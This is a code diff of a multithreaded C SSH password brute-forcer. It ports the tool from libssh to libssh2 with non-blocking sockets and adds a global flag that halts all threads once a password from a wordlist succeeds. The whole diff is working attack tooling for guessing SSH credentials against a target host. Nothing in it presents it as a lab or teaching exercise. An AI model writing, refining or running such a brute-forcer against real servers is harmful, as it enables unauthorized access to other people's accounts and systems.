@@ -1,8 +1,15 @@
-#include <libssh/libssh.h>
+#include <libssh2.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
 #include <pthread.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/time.h>
 
 #define MAX_LEN 256
 
@@ -14,33 +21,80 @@ typedef struct {
     int verbose;
 } thread_args_t;
 
+volatile int password_found = 0; // Global flag
+
 void *try_credentials(void *args) {
+    if (password_found) return NULL; // Exit if password already found
+
     thread_args_t *t_args = (thread_args_t *)args;
-    ssh_session my_ssh_session = ssh_new();
-    if (my_ssh_session == NULL) return NULL;
-
-    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, t_args->hostname);
-    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &t_args->port);
-
-    int rc = ssh_connect(my_ssh_session);
-    if (rc != SSH_OK) {
-        fprintf(stderr, "Error connecting to %s:%d: %s\n", t_args->hostname, t_args->port, ssh_get_error(my_ssh_session));
-        ssh_free(my_ssh_session);
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == -1) {
+        perror("Failed to create socket");
         return NULL;
+    }
+
+    struct sockaddr_in sin;
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(t_args->port);
+    sin.sin_addr.s_addr = inet_addr(t_args->hostname);
+
+    fcntl(sock, F_SETFL, O_NONBLOCK);
+
+    int rc = connect(sock, (struct sockaddr*)(&sin), sizeof(struct sockaddr_in));
+    if (rc != 0 && errno != EINPROGRESS) {
+        perror("Failed to connect");
+        close(sock);
+        return NULL;
+    }
+
+    fd_set fds;
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+
+    struct timeval tv;
+    tv.tv_sec = 10;
+    tv.tv_usec = 0;
+
+    rc = select(sock + 1, NULL, &fds, NULL, &tv);
+    if (rc <= 0) {
+        perror("Failed to connect");
+        close(sock);
+        return NULL;
+    }
+
+    LIBSSH2_SESSION *session = libssh2_session_init();
+    libssh2_session_set_blocking(session, 0);
+
+    while (libssh2_session_handshake(session, sock) == LIBSSH2_ERROR_EAGAIN) {
+        if (password_found) {
+            close(sock);
+            libssh2_session_free(session);
+            return NULL;
+        }
     }
 
     if (t_args->verbose) {
         printf("Attempting - Username: %s, Password: %s\n", t_args->username, t_args->password);
-        fflush(stdout); // Ensure output is printed immediately
+        fflush(stdout);
     }
 
-    rc = ssh_userauth_password(my_ssh_session, t_args->username, t_args->password);
-    if (rc == SSH_AUTH_SUCCESS) {
+    do {
+        rc = libssh2_userauth_password(session, t_args->username, t_args->password);
+        if (password_found) {
+            close(sock);
+            libssh2_session_free(session);
+            return NULL;
+        }
+    } while (rc == LIBSSH2_ERROR_EAGAIN);
+
+    if (rc == 0) {
         printf("Credentials found - Username: %s, Password: %s\n", t_args->username, t_args->password);
+        password_found = 1; // Set global flag
     }
 
-    ssh_disconnect(my_ssh_session);
-    ssh_free(my_ssh_session);
+    libssh2_session_disconnect(session, "Normal Shutdown");
+    libssh2_session_free(session);
+    close(sock);
     free(t_args->password);
     free(t_args);
     return NULL;
@@ -76,6 +130,8 @@ void create_threads(const char *hostname, int port, const char *username, const 
         } else if (pass_file != NULL) {
             // Password list test
             while (fgets(word, sizeof(word), pass_file)) {
+                if (password_found) break; // Exit if password found
+
                 // Remove newline character
                 char *newline = strchr(word, '\n');
                 if (newline) *newline = '\0';
@@ -103,37 +159,6 @@ void create_threads(const char *hostname, int port, const char *username, const 
                     }
                     current_thread = 0;
                 }
-            }
-        }
-    } else if (pass_file != NULL) {
-        // Only password list test
-        while (fgets(word, sizeof(word), pass_file)) {
-            // Remove newline character
-            char *newline = strchr(word, '\n');
-            if (newline) *newline = '\0';
-
-            // Prepare thread arguments
-            thread_args_t *t_args = malloc(sizeof(thread_args_t));
-            t_args->hostname = hostname;
-            t_args->port = port;
-            t_args->username = NULL; // Use NULL for username since it's from password list
-            t_args->password = strdup(word); // Use password list for password
-            t_args->verbose = verbose;
-
-            if (pthread_create(&threads[current_thread], NULL, try_credentials, t_args) != 0) {
-                perror("Failed to create thread");
-                free(t_args->password);
-                free(t_args);
-            } else {
-                current_thread++;
-            }
-
-            // Wait for threads if the limit is reached
-            if (current_thread >= thread_count) {
-                for (int i = 0; i < thread_count; i++) {
-                    pthread_join(threads[i], NULL);
-                }
-                current_thread = 0;
             }
         }
     }
@@ -212,7 +237,9 @@ int main(int argc, char *argv[]) {
         }
     }
 
+    libssh2_init(0);
     create_threads(hostname, port, username, password, pass_file, thread_count, verbose);
+    libssh2_exit();
 
     if (pass_file != NULL) fclose(pass_file);
 
